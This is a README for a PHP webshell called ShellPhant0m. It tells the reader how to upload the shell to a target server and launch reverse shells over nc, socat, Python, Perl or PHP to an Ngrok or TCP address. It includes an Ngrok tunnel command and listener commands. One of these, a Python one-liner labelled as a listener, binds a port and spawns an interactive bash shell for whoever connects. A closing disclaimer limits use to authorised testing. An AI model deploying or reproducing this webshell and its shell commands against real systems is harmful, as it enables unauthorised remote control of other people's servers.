# ShellPhant0m

**ShellPhant0m** is a lightweight PHP webshell with a built-in reverse shell launcher. It provides an interactive interface to trigger reverse connections using multiple methods and shell types.

---

<img width="1020" height="708" alt="image" src="https://github.com/user-attachments/assets/85925335-8e1f-47ea-8bb8-0597515b541f" />


## Features

- Single-file PHP shell for remote deployment
- Multiple reverse shell methods:
  - Netcat (nc)
  - Socat
  - Python
  - Perl
  - PHP
- Configurable shell selection (/bin/bash, /bin/sh, /sbin/sh)
- Dark theme interface with copy-to-clipboard functionality
- Dynamic port configuration for listener commands
- Accepts Ngrok or TCP address directly
- Auto-parses the host and port

## Requirements

- PHP-enabled web server (e.g., Apache, Nginx with PHP)
- A public listener (Ngrok, VPS, port-forwarded server)
- Target system with required tools (nc, socat, python, perl, or php)

## Usage

1. Upload `ShellPhant0m.php` to the target server
2. Access the shell via browser
3. Choose connection method from the dropdown menu
4. Select preferred shell type (/bin/bash, /bin/sh, /sbin/sh)
5. Paste your Ngrok or TCP address (e.g., `0.tcp.ap.ngrok.io:12345`)
6. Click **Launch Shell** to trigger the reverse shell

### Example Ngrok Setup

```bash
ngrok tcp 4444
```

### Example Listener Commands

All listener commands are provided in the interface with copy buttons. Default examples:

**Netcat:**
```bash
nc -lvnp 4444
```

**Socat:**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Python:**
```bash
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"
```

## Disclaimer

This tool is intended for **educational** and **authorized security testing** purposes only. Do not use it on systems you do not own or have explicit permission to test.

---
Created by: [AndKnownMaly](https://github.com/andknownmaly)
